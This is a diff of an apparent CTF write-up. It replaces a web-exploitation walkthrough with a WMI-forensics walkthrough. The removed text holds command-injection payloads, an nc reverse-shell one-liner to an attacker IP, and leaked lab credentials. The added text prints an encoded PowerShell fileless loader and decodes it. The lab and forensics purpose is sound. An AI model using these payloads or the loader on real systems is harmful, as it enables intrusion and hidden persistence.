@@ -1,179 +1,85 @@
-# Day 11 — Infinity Pool
+# Day 11 — After Hours
 
 ## Summary
 
-No visible edge. You trace the network to the horizon and find three systems nobody told you about on the other side.
+Bar closed. Guests asleep. Something on the network just clocked in for a shift off the rotation.
 
 ## Objective
 
-Byte Lotus Hotel promises a seamless stay powered by modern technology. Sometimes the most interesting systems are the ones guests were never meant to see.
+Something is persisting on the resort's back-office machine outside normal hours, with nothing showing up in Startup, Scheduled Tasks, or Run keys. Working offline from three raw repository files, I need to find where it's hiding, extract its payload, and recover the flag.
 
 ## Tools / Techniques / Threat Vectors
 
-- Nmap & Gobuster enumeration
-- OS command injection (unauthenticated + authenticated)
-- Reverse shell via Penelope
-- Internal service discovery through process listing (`ps aux`)
-- Config/credential leakage through an internal API
-- Chisel reverse port forwarding for local-only web app access
-- FreePBX UCP hard-coded template credentials (CVE-2026-46376)
-- Bearer-token authenticated command injection leading to root
-
----
+- **`strings`** (with both default ASCII and `-e l` for UTF-16LE) — the first and fastest way to surface anything human-readable inside binary data without needing to understand the underlying file format yet.
+- **WMI Repository forensics** — `OBJECTS.DATA`, `INDEX.BTR`, and `MAPPING*.MAP` together make up the WMI CIM repository, normally living at `C:\Windows\System32\wbem\Repository\`. It's a legitimate Windows management database that's also a well-known, low-visibility persistence spot, since it doesn't show up in Startup, Scheduled Tasks, or Run keys.
+- **PowerShell `-EncodedCommand` (`-enc`)** — a common obfuscation technique where the actual script is hidden as a Base64-encoded, UTF-16LE string, so it doesn't trip simple keyword-based log searches.
+- **Fileless / reflective loading** — the payload chain here never touches disk as a standalone executable. It's Base64-decoded, Deflate-decompressed, and loaded directly into memory as a .NET assembly via `[Reflection.Assembly]::Load()`, which is why nothing shows up in a normal file-based sweep.
+- **CyberChef** — used to replicate, step by step, exactly what the malicious PowerShell was doing to its payload (`From Base64` → `Raw Inflate` → `Strings`), so I could see the same decoded output an attacker's script would have produced at runtime.
+- **Living-off-the-land smuggling** — the final payload used the built-in `net user ... /add` command to plant a suspicious value disguised as a Windows account password, a technique for slipping data past log review since it looks like routine account administration.
 
 ## Steps Taken
 
-1. I'm greeted with a web page, so before touching anything I inspect the page source and the browser's Network tab to see what resources are actually being requested and rendered. That habit pays off almost immediately.
+1. In this room, I'm doing forensics on a Windows-based machine's remnants — but instead of a live filesystem, I'm handed just three files: `OBJECTS.DATA`, `INDEX.BTR`, and a `MAPPING*.MAP` file. These three together are the **WMI (Windows Management Instrumentation) repository**, a core database Windows uses to store system management data, class definitions, and operational metadata. It's not something most people ever interact with directly, which is exactly why it makes a good hiding spot.
 
-    ![Day 11 Screenshot 1](image1.png)
-    ![Day 11 Screenshot 2](image2.png)
+    ![Day 12 Screenshot 1](image1.png)
 
-    From there I run my usual enumeration pass against the target:
+    These files are binary and not meant to be read directly, so rather than trying to hand-parse the CIM format, I started with the simplest tool available: `strings`, piped into `grep` for something specific — in this case, `powershell`, since if anything malicious was persisting here, it was likely to be invoking PowerShell at some point.
 
-    ```bash
-    nmap -sT -sV -sC <IP-ADDRESS> -oN nmap.txt
-    gobuster dir -u "http://<IP-ADDRESS>/" -w /usr/share/wordlists/dirb/common.txt
-    ```
+    ![Day 12 Screenshot 2](image2.png)
+    ![Day 12 Screenshot 3](image3.png)
+    ![Day 12 Screenshot 4](image4.png)
 
-    Nmap comes back with port 22 (SSH) open, but since this is a web category challenge I don't sink time into it. Gobuster is more useful here — it turns up two things worth chasing: **robots.txt** and **status**.
-
-    ![Day 11 Screenshot 3](image3.png)
-
-2. Before jumping into either of those, I check `/static/app.js` and `/static/style.css`, since I noticed the page was pulling them in before I ever hit robots.txt or /status.
-
-    ![Day 11 Screenshot 4](image4.png)
-
-    `app.js` turns out to be mostly a red herring — just a `console.log` comment — but it does confirm that `/status` is meant to be reachable, which lines up with what robots.txt is about to tell me. Speaking of which, robots.txt reads:
-
-    ```text
-    User-agent: *
-    Disallow: /internal/
-    Disallow: /status
-    ```
-
-    Anything a robots.txt file explicitly tells me *not* to look at is exactly where I look next.
-
-    **/status directory**
-
-    ![Day 11 Screenshot 5](image5.png)
-
-    This page presents itself as a "sister-property connectivity" checker — it takes an IP address and pings it. I plug in my attacker IP just to see what happens, and sure enough, I get back a normal `ping` echo response rendered on the page.
-
-    ![Day 11 Screenshot 6](image6.png)
-
-    That's my cue to test for command injection. If this page is genuinely shelling out to `ping` behind the scenes, I should be able to break out of that command and chain my own. I try appending a semicolon followed by a harmless test command:
-
-    `; echo "hello"` and then `; whoami`
-
-    ![Day 11 Screenshot 7](image7.png)
-
-3. Both come back clean — no filtering, no sanitization. At this point I know I can weaponize this input field, so I set up a Penelope listener and fire off a reverse shell payload through the same injection point:
+    That single grep was enough to surface a lead across both the `.BTR` and `.DATA` files: a `cmd /C powershell.exe -Sta -Nop -Window Hidden -enc ...` command, with a long Base64 blob as its payload.
 
     ```bash
-    ; rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc <IP-ADDRESS> 4444 >/tmp/f
+    cmd /C powershell.exe -Sta -Nop -Window Hidden -enc JABmAGkAbABlACAAPQAgACgAWwBXAG0AaQBDAGwAYQBzAHMAXQAnAFIATwBPAFQAXABjAGkAbQB2ADIAOgBXAGkAbgAzADIAXwBIAGEAcgBkAHcAYQByAGUAVABlAGwAZQBtAGUAdAByAHkAJwApAC4AUAByAG8AcABlAHIAdABpAGUAcwBbACcAQwBvAG4AZgBpAGcARABhAHQAYQAnAF0ALgBWAGEAbAB1AGUAOwANAAoAJABvACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBNAGUAbQBvAHIAeQBTAHQAcgBlAGEAbQA7AA0ACgAkAGQAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEQAZQBmAGwAYQB0AGUAUwB0AHIAZQBhAG0AKABbAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtAF0AWwBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAkAGYAaQBsAGUAKQAsAFsASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAE0AbwBkAGUAXQA6ADoARABlAGMAbwBtAHAAcgBlAHMAcwApADsADQAKACQAYgAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AKAAxADAAMgA0ACkAOwANAAoAJAByACAAPQAgACQAZAAuAFIAZQBhAGQAKAAkAGIALAAwACwAMQAwADIANAApADsADQAKAHcAaABpAGwAZQAoACQAcgAgAC0AZwB0ACAAMAApAHsADQAKACAAIAAgACAAJABvAC4AVwByAGkAdABlACgAJABiACwAMAAsACQAcgApADsADQAKACAAIAAgACAAJAByACAAPQAgACQAZAAuAFIAZQBhAGQAKAAkAGIALAAwACwAMQAwADIANAApADsADQAKAH0ADQAKAFsAUgBlAGYAbABlAGMAdABpAG8AbgAuAEEAcwBzAGUAbQBiAGwAeQBdADoAOgBMAG8AYQBkACgAJABvAC4AVABvAEEAcgByAGEAeQAoACkAKQAuAEUAbgB0AHIAeQBQAG8AaQBuAHQALgBJAG4AdgBvAGsAZQAoACQAbgB1AGwAbAAsAEAAKAAsAFsAcwB0AHIAaQBuAGcAWwBdAF0AQAAoACkAKQApAHwATwB1AHQALQBOAHUAbABsAA==
     ```
 
-    ![Day 11 Screenshot 8](image8.png)
+    PowerShell's `-EncodedCommand` flag doesn't just Base64-encode plain ASCII — it encodes UTF-16LE text, which is why decoding it naively just gives back a mess of null-byte-separated characters. Once I accounted for that and cleaned it up, the real script underneath was:
 
-    Shell in hand, I run `whoami` to confirm my landing user, then head to that user's home directory to grab the user flag.
-
-    ![Day 11 Screenshot 9](image9.png)
-
-4. With the user flag secured, I turn my attention to root. Stepping one directory up from where I landed, I find two more directories sitting right alongside the one I initially exploited: `automation` and `watchtower`.
-
-    ![Day 11 Screenshot 10](image10.png)
-
-    Neither is readable as my current user, but a quick look at running processes tells me exactly why they matter — both are backing live services:
-
-    ![Day 11 Screenshot 11](image11.png)
-
-    - `automation` is running as **root**, bound to `127.0.0.1:9000`
-    - `watchtower` is running as `svc-watch`, bound to `127.0.0.1:3000`
-
-    Both are loopback-only, but I'm already on the box, so that's not a barrier. I curl each one directly:
-
-    ```bash
-    curl -s http://127.0.0.1:3000/
-    curl -s http://127.0.0.1:9000/
-    ```
-
-    ![Day 11 Screenshot 12](image12.png)
-
-    Port 9000 gives me nothing useful yet, but port 3000 answers with a full HTML page describing itself as "Watchtower — ops console," and conveniently lists its own endpoints: `/api/health` and `/api/config`. I go straight for `/api/config`.
-
-    ![Day 11 Screenshot 13](image13.png)
-
-5. That config leak is the real turning point. It hands me credentials for a third internal service — a telephony portal on port 8080:
-
-    ```text
-    telephony_portal: http://127.0.0.1:8080/ucp
-    telephony_user:   FreePBXUCPTemplateCreator
-    telephony_pass:   St4yN0t1c3d_2026
-    ```
-
-    A curl to that path confirms it's a FreePBX User Control Panel login page. Rather than fight through a login flow blind over curl, I decide it's worth getting real browser access to this internal service, so I pivot to Chisel:
-
-    - On my attacker box, I start a Chisel server in reverse mode: `./chisel server -p 8000 --reverse`
-    - I drop a matching Chisel client binary onto the target through my existing shell and connect it back: `./chisel client <attacker-ip>:8000 R:8080:127.0.0.1:8080`
-
-    With the tunnel up, `http://127.0.0.1:8080/ucp` in my own browser now transparently reaches the target's internal-only FreePBX instance. I log in with the leaked credentials and I'm in.
-
-    ![Day 11 Screenshot 14](image14.png)
-    ![Day 11 Screenshot 15](image15.png)
-
-    Worth noting for the record: those "leaked" credentials aren't just a lucky find specific to this box — `FreePBXUCPTemplateCreator` is a real, publicly known hard-coded template account (CVE-2026-46376), left active on any FreePBX deployment where the admin never rotated it after enabling the UCP generic template setup. The box even hints at this directly — the config leak includes a note reading *"UCP still on default template creds — ROTATE."*
-
-6. Once inside UCP, I start clicking through everything the account can see. Adding more Dashboard Widgets eventually surfaces something the interface wasn't obviously advertising: a **bearer token**, tucked away as an "Automation Key."
-
-    ![Day 11 Screenshot 16](image17.png)
-    ![Day 11 Screenshot 17](image16.png)
-
-    That name is a direct callback to the root-owned `automation` service sitting on port 9000 — the one that gave me nothing on an unauthenticated request earlier. Hitting `/health` on that service (rather than my earlier guess of `/api/health`) finally returns something:
-
-    ```json
-    {
-      "endpoints": {
-        "GET /health": "service status",
-        "POST /jobs/export": {
-          "auth": "Authorization: Bearer <automation key>",
-          "body": {"report": "<report name>"},
-          "desc": "archive the latest data export"
-        }
-      },
-      "runs_as": "root",
-      "service": "automation",
-      "status": "ok"
+    ```powershell
+    $file = ([WmiClass]'ROOT\cimv2:Win32_HardwareTelemetry').Properties['ConfigData'].Value;
+    $o = New-Object IO.MemoryStream;
+    $d = New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($file),[IO.Compression.CompressionMode]::Decompress);
+    $b = New-Object Byte[](1024);
+    $r = $d.Read($b,0,1024);
+    while($r -gt 0){
+        $o.Write($b,0,$r);
+        $r = $d.Read($b,0,1024);
     }
+    [Reflection.Assembly]::Load($o.ToArray()).EntryPoint.Invoke($null,@(,[string[]]@()))|Out-Null
     ```
 
-    ![Day 11 Screenshot 18](image18.png)
+    Reading through this told me exactly what to hunt for next. It wasn't malware sitting somewhere on disk — it was a **fileless loader**. The script reaches into WMI, grabs a property called `ConfigData` off a fake, custom-made class named `Win32_HardwareTelemetry` (dressed up to look like a legitimate `Win32_` class), Base64-decodes it, decompresses it with raw Deflate, and reflectively loads the resulting bytes directly into memory as a .NET assembly — never touching disk as a standalone `.exe`. That explains why none of the usual persistence locations showed anything: the "malware" here is just data sitting inside the WMI repository itself, and momentary bytes in RAM once triggered.
 
-    Now I have everything I need: an endpoint, a required header, and the token to satisfy it. I send a POST request to `/jobs/export`:
+2. With the loader script fully understood, my next target was obvious: that `ConfigData` property itself, since that's where the real payload lives. I ran `strings` on `OBJECTS.DATA` again, this time grepping for `ConfigData` and `HardwareTelemetry` directly.
 
-    ```bash
-    curl -s -X POST \
-      -H "Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a" \
-      -H "Content-Type: application/json" \
-      -d '{"report": "root"}' \
-      http://127.0.0.1:9000/jobs/export
+    ![Day 12 Screenshot 5](image5.png)
+
+    That immediately surfaced the actual value being read — a long Base64 blob sitting right next to the `Win32_HardwareTelemetry`/`ConfigData` property names in the repository. To confirm what this blob actually was, I rebuilt the exact same transformation the PowerShell script performs, using CyberChef so I could visually step through each stage:
+
+    ```text
+    From Base64
+    Raw Inflate
+    Strings
     ```
 
-    The response doesn't just confirm success — it echoes back the exact shell command being executed server-side:
+    `Raw Inflate` — not `Zlib Inflate` or `Gunzip` — matters here specifically, because .NET's `DeflateStream` produces headerless raw DEFLATE data, not a zlib or gzip-wrapped stream. Feeding it through the wrong inflate operation just errors out or produces garbage.
 
-    ```
-    tar czf /var/automation/exports/root.tgz /var/automation/data
-    ```
+    ![Day 12 Screenshot 6](image6.png)
 
-    That's my `report` value dropped straight into a shell command with zero sanitization. Since the service builds this as a raw shell string, I can break out with a semicolon and comment out the rest of the line with `#`. I confirm code execution first with a harmless `id` call, see it come back as root, and then swap the payload for a reverse shell one-liner.
+3. Even with the right recipe, the `Strings` output initially looked like garbage — every readable character was interleaved with the word `NUL`. That's not an error; it's CyberChef's **Raw Bytes** output view spelling out every null byte literally, because the payload's text was stored as UTF-16LE (2 bytes per character), same as the PowerShell `-enc` blob from Step 1.
 
-    ![Day 11 Screenshot 19](image19.png)
+    ![Day 12 Screenshot 7](image7.png)
 
-    With a root shell landed, I stabilize it with a quick PTY upgrade, head to `/root/`, and cat out `root.txt`.
+    Switching the output view from **Raw Bytes** to **Text** collapsed those null bytes automatically and gave me clean, readable output. Scanning through it, I found what the loaded .NET assembly was actually doing at runtime: checking the machine name against a hardcoded target, then — if it matched — spawning a hidden `cmd.exe` running a `net user patch <value> /add` command. The "value" being passed as the new account's password wasn't a real password at all — it was another layer of Base64, smuggled through a legitimate-looking Windows account-management command specifically so it wouldn't stand out as an obvious secret in casual log review.
 
-    ![Day 11 Screenshot 20](image20.png)
+    Decoding that final Base64 string gave me the flag.
 
----
+    ![Day 12 Screenshot 8](image8.png)
 
 ## What I Learned
 
-This box was a good reminder that a "no visible edge" hint is usually pointing you toward services that only exist on loopback — the real attack surface here was never the public-facing site itself, it was the chain of internal apps talking to each other behind it, discoverable only once I already had a foothold and could run `ps aux`. Each service leaked just enough to reach the next one: the ping field got me a shell, the shell let me see `watchtower` and `automation` as processes, `watchtower`'s config endpoint leaked FreePBX credentials, FreePBX's UCP handed me a bearer token, and that token unlocked a root-owned automation endpoint with the exact same unsanitized command-injection pattern I'd already exploited once at the very start. It also reinforced two habits worth keeping: don't stop enumerating a service just because the obvious paths 404 — `/health` existed right next to the `/api/health` guess that failed — and when real-world CVEs show up in a lab (like the FreePBX hard-coded template creds), it's worth pausing to actually read the advisory, since it usually explains *why* the vulnerability exists rather than just confirming that it does.
+This one really drove home how much low-visibility real estate Windows has for persistence outside the places I'd normally think to check — the WMI repository isn't hidden exactly, it's just quiet, and a fake class with a plausible-sounding name like `Win32_HardwareTelemetry` blends in easily among hundreds of legitimate ones. I also got a much better feel for the fileless-loader pattern end to end: Base64 to strip out special characters for safe transport, raw Deflate to shrink the payload, and `Reflection.Assembly.Load()` to run it entirely in memory without ever writing an executable to disk — a chain that's genuinely used in real-world tradecraft, not just CTF flavor. The `net user ... /add` trick was the most interesting individual technique for me, since it's such a simple abuse of a completely mundane built-in command to smuggle data past anyone skimming logs for anything obviously suspicious. And on the tooling side, working through the UTF-16LE null-byte confusion twice (once in raw PowerShell decoding, once in CyberChef's Strings output) reinforced that encoding assumptions are one of the most common places forensic analysis quietly goes wrong.
+
+---
